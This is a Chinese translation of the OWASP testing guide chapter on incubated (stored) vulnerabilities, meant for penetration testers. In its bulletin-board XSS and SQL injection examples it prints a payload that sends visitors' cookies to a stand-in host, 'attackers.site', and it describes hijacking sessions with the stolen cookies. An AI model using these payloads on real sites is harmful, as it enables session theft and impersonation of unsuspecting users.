# 潜伏性漏洞测试

## 概述

孵化测试（通常也称为持久化攻击）是一种复杂的测试方法，需要利用多个数据验证漏洞才能生效。孵化漏洞通常用于针对合法网络应用程序用户实施"水坑攻击"。

孵化漏洞具有以下特征：

- 攻击向量首先需要实现持久化存储，必须被保存在持久化层中。这种情况通常源于存在薄弱的数据验证机制，或数据通过其他渠道进入系统（如管理控制台或直接通过后端批处理过程）。
- 其次，当攻击向量被"召回"时，需要成功执行。例如，孵化型XSS攻击需要薄弱的输出验证机制，才能使得恶意脚本以可执行形式传递给客户端。

某些漏洞的利用（甚至网络应用程序的功能特性）可使攻击者植入数据，这些数据随后会被未察觉的用户或系统其他组件获取，从而利用目标环境存在的漏洞。

在渗透测试中，`incubated attacks`可用于评估特定漏洞的严重性，利用已发现的安全问题构建基于客户端的攻击链，通常用于同时针对大量受害者（例如所有访问该网站的用户）。

这类异步攻击涵盖多种攻击向量，主要包括：

- Web应用程序文件上传组件：允许攻击者上传恶意媒体文件（利用`CVE-2004-0200`的JPEG图像、利用`CVE-2004-0597`的PNG图像、可执行文件、含动态组件的网页等）
- 公共论坛存储型XSS漏洞（详见[存储型跨站脚本测试/WSTG](02-Testing_for_ored_Cross_Site_Scripting.md)）。攻击者可能将恶意脚本或代码存储于Web应用后端（如数据库），当用户（终端用户、管理员等）访问时触发执行。典型案例如利用论坛/公告板/博客的XSS漏洞在页面注入JavaScript代码，最终在用户浏览器端借助原可信站点的权限执行
- SQL/XPATH注入漏洞：允许攻击者向数据库注入内容，后续这些内容作为动态页面组成部分被检索执行。例如攻击者通过公告板注入任意JavaScript代码控制用户浏览器（如[XSS-proxy](https://sourceforge.net/projects/xss-proxy)）
- 服务器配置不当：允许安装Java包或类似站点组件（如Tomcat、Plesk、CPanel、Helm等Web托管控制台）

## 测试目标

- 识别需要召回步骤的存储型注入攻击。
- 理解召回步骤的触发机制。
- 尽可能设置监听器或激活召回步骤。

## 测试方法

### 黑盒测试

#### 文件上传示例

验证允许上传至Web应用程序的内容类型及上传文件的最终URL。上传一个可在用户查看或下载时利用其本地工作站组件的文件，通过邮件或其他方式诱导受害者访问该页面。预期结果是当用户浏览目标页面或从受信任站点下载执行文件时触发漏洞利用。

#### 公告板XSS示例

1.  向存在漏洞的字段值注入JavaScript代码，例如：
    `<script>document.write('<img src="https://attackers.site/cv.jpg?'+document.cookie+'">')</script>`
2.  引导用户访问存在漏洞的页面，或等待用户自行访问。在 `attackers.site` 主机上设置一个"监听器"以监听所有传入连接。
3.  当用户访问该漏洞页面时，一个包含其Cookie（`document.cookie` 作为请求URL的一部分）的请求将被发送到 `attackers.site` 主机，例如：
    `GET /cv.jpg?SignOn=COOKIEVALUE1;%20ASPSESSIONID=ROGUEIDVALUE; HTTP/1.1`
4.  使用获取到的Cookie在漏洞站点冒充用户身份。

#### SQL注入示例

通常，这类示例通过利用SQL注入漏洞来发起XSS攻击。首先需要测试目标站点是否存在SQL注入漏洞，具体方法参见[SQL注入测试/WSTG](05-Testing_for_SQL_Injection.md)。对于每个SQL注入漏洞，都存在一组底层约束，描述了攻击者/渗透测试者被允许执行的查询类型。

测试人员需要将其设计的XSS攻击与允许插入的条目进行匹配。

与前述XSS示例类似，利用对SQL注入问题脆弱的网页字段，来更改数据库中的某个值，该值会被应用程序用作站点的输入内容并在未经适当过滤的情况下显示（这属于SQL注入与XSS问题的结合）。例如，假设数据库中有一个 `footer` 表，存储了所有网站页面的页脚信息，其中包含一个 `notice` 字段，用于显示在每个网页底部的法律声明。您可以使用以下查询语句将JavaScript代码注入到数据库 `footer` 表的 `notice` 字段中。

```sql
SELECT field1, field2, field3
FROM table_x
WHERE field2 = 'x';
   UPDATE footer
   SET notice = 'Copyright 1999-2030%20
       <script>document.write(\'<img src="https://attackers.site/cv.jpg?\'+document.cookie+\'">\')</script>'
   WHERE notice = 'Copyright 1999-2030';
```

现在，每个浏览网站的用户都会默默地将其 cookie 发送到 `attackers.site`

#### 服务器配置不当

部分Web服务器提供的管理接口可能允许攻击者上传任意恶意组件。例如，未设置强认证机制的Apache Tomcat服务器访问其Web应用管理器时（或渗透测试人员通过其他方式获取了管理模块的有效凭证）。

在此场景下，攻击者可上传WAR文件并在站点部署新的Web应用，不仅能实现在服务器本地执行任意代码，还能在受信任站点植入恶意应用（常规用户访问时通常比对其他站点具有更高信任度）。

显然，若攻击者通过主机漏洞获取Web根目录写入权限（例如利用可修改服务器网页内容的漏洞），同样可用于在Web服务器页面植入孵化攻击（实际上，这正是部分Web服务器蠕虫的已知传播方式）。

### 灰盒测试

灰盒或白盒测试技术与前述方法一致：
- **输入验证检查**是缓解该漏洞的关键。若企业内其他系统共用同一持久化层且存在弱输入验证机制，数据可能通过"后门"途径持久化存储。
- **针对客户端攻击的后门防护**需结合输出验证机制，确保渲染至客户端前对污染数据进行编码处理，阻止其执行。

## 工具

- [XSS-proxy](https://sourceforge.net/projects/xss-proxy)
- [Zed Attack Proxy (ZAP)](https://www.zaproxy.org/)
- [Burp Suite](https://portswigger.net/burp)
- [Metasploit](https://www.metasploit.com/)

## 参考文献

- [WSTG-INPV-14](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/14-Testing_for_Incubated_Vulnerability.md#xss-example-on-a-bulletin-board)

跨站脚本章节的大部分参考文献均适用。如前所述，孵化攻击通过组合利用XSS或SQL注入等漏洞实现。

<!--  -->
是否应当归到 XSS 与 SQL 的章节中？
<!--  -->

### 安全公告
- [CERT公告CA-2000-02：客户端Web请求中嵌入恶意HTML标签](https://resources.sei.cmu.edu/library/asset-view.cfm?assetID=496186)
- [Blackboard Academic Suite 6.2.23 +/-：持久性跨站脚本漏洞](https://cxsecurity.com/issue/WLB-2006080004)
